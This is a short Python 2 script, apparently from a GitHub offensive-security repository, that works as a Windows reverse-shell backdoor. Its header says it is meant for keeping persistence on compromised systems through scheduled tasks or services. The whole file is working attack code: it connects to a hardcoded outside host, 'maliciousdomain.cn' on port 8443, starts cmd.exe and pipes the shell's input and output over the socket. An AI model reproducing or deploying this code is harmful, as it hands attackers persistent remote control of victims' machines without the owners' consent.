#!C:\Python27\python.exe
#Title: bd.py
#Author: ApexPredator
#License: MIT
#Github: https://github.com/ApexPredator-InfoSec/back_door
#Description: This script provides a reverse shell Windows systems. It can be used to establish persistence after compromising a system by setting a cronjob, scheduled task, or service to run the script to reestablish connection after reboots, etc.
import socket
import subprocess
import os
import threading
import sys

RHOST = 'maliciousdomain.cn'
RPORT = 8443


#Windows reverse shell and bind shells modified from code found https://stackoverflow.com/questions/37991717/python-windows-reverse-shell-one-liner
def soc2proc(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def proc2soc(s, p):
    while True:
        s.send(p.stdout.read(1))

def rvshw():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("%s" %RHOST,RPORT))

    p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

    soc2proc_thread = threading.Thread(target=soc2proc, args=[s, p])
    soc2proc_thread.daemon = True
    soc2proc_thread.start()

    proc2soc_thread = threading.Thread(target=proc2soc, args=[s, p])
    proc2soc_thread.daemon = True
    proc2soc_thread.start()

    try:
        p.wait()
    except KeyboardInterrupt:
        s.close()

    return

def main():

    rvshw()

if __name__ == '__main__':

    main()
